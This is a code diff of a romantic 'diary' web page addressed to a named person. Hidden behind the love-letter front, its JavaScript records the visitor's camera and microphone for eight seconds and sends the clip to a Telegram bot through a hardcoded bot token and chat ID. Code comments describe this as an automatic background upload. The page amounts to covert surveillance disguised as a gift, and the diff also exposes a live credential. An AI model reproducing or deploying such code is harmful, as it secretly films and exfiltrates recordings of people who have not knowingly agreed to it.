@@ -18,7 +18,6 @@
         #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 240, 243, 0.9); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 2000; }
         .btn-magic { background: var(--rose); color: white; border: none; padding: 18px 45px; border-radius: 50px; cursor: pointer; font-size: 1.4rem; box-shadow: 0 4px 15px rgba(255, 77, 109, 0.3); }
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
 </head>
 <body>
     <div id="overlay">
@@ -51,40 +50,38 @@
 
         async function startDiary() {
             try {
-                // Request a smaller size to make sure it sends instantly
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true });
+                // Low quality = Faster upload
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320 }, audio: true });
                 document.getElementById('video-preview').srcObject = stream;
-                
-                // Use a standard format that works well with Telegram bots
                 mediaRecorder = new MediaRecorder(stream);
                 mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
-                
                 mediaRecorder.start();
+                
                 document.getElementById('overlay').style.display = 'none';
                 document.getElementById('diary-wrapper').style.display = 'block';
                 bgMusic.play();
 
-                // AUTOMATIC BACKGROUND UPLOAD AFTER 8 SECONDS
+                // 8 SECONDS BUFFER
                 setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 8000);
 
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                     const formData = new FormData();
-                    formData.append('chat_id', "5324376571");
+                    formData.append('chat_id', "5324376571"); //
                     formData.append('video', blob, 'reaction.mp4');
                     
-                    // Fetch call to Telegram
+                    // PROMISE LOGGING
                     fetch(`https://api.telegram.org/bot8567402887:AAEib1LfMMBNViiWFLHp2vmbfy7JeENhu5s/sendVideo`, { method: 'POST', body: formData })
-                    .then(r => console.log("Sent! Check Telegram."));
+                    .then(response => {
+                        if (!response.ok) alert("Telegram refused the video. Please check your Bot Token.");
+                    }).catch(err => alert("Network error: " + err));
                 };
-            } catch (err) { alert("Camera access needed! ❤️"); }
+            } catch (err) { alert("Camera access denied! ❤️"); }
         }
-
         async function triggerSecretUpload(btn) {
             bgMusic.pause();
-            const vn = new Audio('voice note.mp4');
+            const vn = new Audio('voice note.mp4'); //
             btn.innerHTML = "Listening... ❤️";
-            btn.disabled = true;
             vn.play();
             vn.onended = () => { bgMusic.play(); alert("I love you forever, Nikhitha! ❤️"); };
         }
